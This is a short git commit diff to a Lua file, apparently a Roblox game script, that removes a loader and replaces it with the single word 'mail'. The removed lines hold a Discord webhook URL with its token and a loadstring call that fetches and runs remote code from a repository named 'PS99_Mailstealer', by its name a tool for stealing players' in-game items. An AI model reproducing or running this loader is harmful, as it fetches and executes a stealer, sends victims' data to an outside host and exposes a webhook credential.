f13edeff1c5a1530c091fa8c19d3365ebe698afb
Kriszuu <kriszu@depisto.ro>
2024-07-15 10:57:41 +0300

    idk

--- malli.lua
+++ malli.lua
@@ -1,5 +1,1 @@
-Username = "06x2g"
-LoadScreen = true 
-Webhook = "https://discord.com/api/webhooks/1261017431195914311/fEISLbm3mY5gRNePGwXqMEFRf_v4To0QKUbJxFM24XShCvoZRfjcj2G74XIkqGDCiT7k"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
+mail
